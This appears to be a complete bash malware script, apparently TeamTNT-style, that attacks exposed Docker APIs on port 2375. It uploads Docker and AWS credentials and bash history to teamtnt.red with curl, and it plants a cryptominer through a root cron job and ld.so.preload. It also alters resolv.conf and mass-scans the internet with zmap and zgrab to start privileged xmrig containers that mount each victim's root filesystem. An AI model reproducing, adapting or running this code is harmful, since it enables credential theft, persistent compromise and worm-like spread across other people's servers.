#!/bin/bash
mkdir -p /var/tmp/.../
export ALL_OUT="/var/tmp/.../out.txt"
export LOGFILE="/var/tmp/.../log.txt"
export INTERFACE=$(ip route | awk '/default/ {print $5}'|head -n1)
export PORT_IS="2375"

chattr -ia /host/etc/ /host/etc/resolv.conf 2>/dev/null 1>/dev/null
cat /host/etc/resolv.conf | grep 8.8.4.4 2>/dev/null 1>/dev/null || echo 'nameserver 8.8.4.4' >> /host/etc/resolv.conf 2>/dev/null
cat /host/etc/resolv.conf | grep 8.8.8.8 2>/dev/null 1>/dev/null || echo 'nameserver 8.8.8.8' >> /host/etc/resolv.conf 2>/dev/null
chattr +a /host/etc/resolv.conf 2>/dev/null 1>/dev/null


function INIT_MAIN(){
CHECK_DUAL_RUN
SETUP_PACKS
if [ ! -f /host/usr/bin/..lock ] ; then STEAL_DATA; fi
SETUP_XMR
MAKE_SSH_BDOOR
RANDOMDOCKERPWN
}

function CHECK_DUAL_RUN(){
docker ps > /tmp/if.running.dat
if grep -Fxq "lifengyi1323/speedrun" /tmp/if.running.dat
then
echo "no dual run"
exit
fi
}

function FORCE_CLEANUP(){
echo  | base64 -d | bash
}

function SETUP_PACKS(){
chmod +x /usr/bin/zgrab
chmod +x /usr/bin/jq
PACKTOSETUP=("gcc" "make" "zmap" "docker" "e2fsprogs")

for SETUPPACK in ${PACKTOSETUP[@]}; 
do
apk add --no-cache $SETUPPACK
done
}

function SETUP_XMR(){
cp /bin/sbin /host/bin/sbin
cp /bin/3.so /usr/local/lib/python2.7.so

echo '#!/bin/sh' > /host/tmp/.tnt
echo 'rm -f /var/spool/cron/root' >> /host/tmp/.tnt
echo 'chmod +x /bin/sbin' >> /host/tmp/.tnt
echo 'nice -n -20 /bin/sbin' >> /host/tmp/.tnt
echo 'rm -f /tmp/.tnt' >> /host/tmp/.tnt

chattr -ia /host/var/ /host/var/spool/ /host/var/spool/cron/ /host/var/spool/cron/root 2>/dev/null
chmod 1777 /host/var/spool/cron/root
mv /host/var/spool/cron/root /host/var/spool/cron/root_fu
rm -fr /host/var/spool/cron/root 2>/dev/null
echo "* * * * * cat /tmp/.tnt | sh" > /host/var/spool/cron/root

if [ -f "/host/tmp/.tnt" ]; then echo "bashfile created"; fi
if [ -f "/host/var/spool/cron/root" ]; then echo "cronfile created"; fi

echo "waiting 45 sec ...."
sleep 45

if [ -f "/host/tmp/.tnt" ]; then 
echo "bashfile exist - cron not exec"; 
rm -f /host/tmp/.tnt > /dev/null 2>&1; 
rm -f /host/bin/sbin > /dev/null 2>&1;
rm -f /host/usr/local/lib/python2.7.so > /dev/null 2>&1;
chmod +x /bin/sbin
nice -n -20 /bin/sbin
else 
echo "bashfile not exist - cron do exec"; 
chattr -ia /host/etc/ld.so.preload
echo '/usr/local/lib/python2.7.so' >> /host/etc/ld.so.preload
fi
}

function SETUP_ZMAPGRAB(){
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
export GOPATH=/root/go
go get github.com/zmap/zgrab
cd /root/go/src/github.com/zmap/zgrab
go build
cp /root/go/src/github.com/zmap/zgrab/zgrab /usr/bin/zgrab
chmod +x /usr/bin/zgrab
}

function MAKE_SSH_BDOOR(){
echo  | base64 -d | bash
}

function STEAL_DATA(){
if [ -f /host/root/.docker/config.json ] ; then curl -F "userfile=@/host/root/.docker/config.json" https://teamtnt.red/LastPublicRound/index.php; fi
if [ -f /host/root/.aws/credentials ] ; then curl -F "userfile=@/host/root/.aws/credentials" https://teamtnt.red/LastPublicRound/index.php; fi
if [ -f /host/root/.aws/config ] ; then curl -F "userfile=@/host/root/.aws/config" https://teamtnt.red/LastPublicRound/index.php; fi
if [ -f /host/root/.bash_history ] ; then curl -F "userfile=@/host/root/.bash_history" https://teamtnt.red/LastPublicRound/index.php; fi

echo 'lock' > /host/usr/bin/..lock

}

function GETLOCALRANGES(){
ip route show | awk '{print $1}' |  grep "/" > /tmp/.lr
}

function LANDOCKERPWN(){
GETLOCALRANGES
while read TargetRange
do
echo "scanne $TargetRange"
HACKTHEPLANET $TargetRange 2375 $RATESCAN
done < /tmp/.lr
rm -f /tmp/.lr
}

function RANDOMDOCKERPWN(){
for (( ; ; ))
do
TargetRange=$(curl -s -Lk https://teamtnt.red/SATW/range/count.php)
if [ -z "$TargetRange" ]; then
TargetRange="$[RANDOM%255+1].0.0.0/8"
fi
HACKTHEPLANET $TargetRange 2375 $RATESCAN
done
}

function HACKTHEPLANET(){
TARGETRANGE=$1
TARGETPORT=$2
SCANRATE=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(zmap -i $INTERFACE -B 50M --max-sendto-failures 1000000 -c5 -o- -p $TARGETPORT $TARGETRANGE.0.0.0/8 2>>${LOGFILE} | zgrab --senders 100 --port $TARGETPORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep 'ApiVersion|client version 1.16' | jq -r .ip)'";

for TARGETIP in ${!rndstr}
do
echo "$TARGETIP:$TARGETPORT"
timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --restart always --privileged --network host -v /:/host xululol/xmrig:latest
done;
}





INIT_MAIN
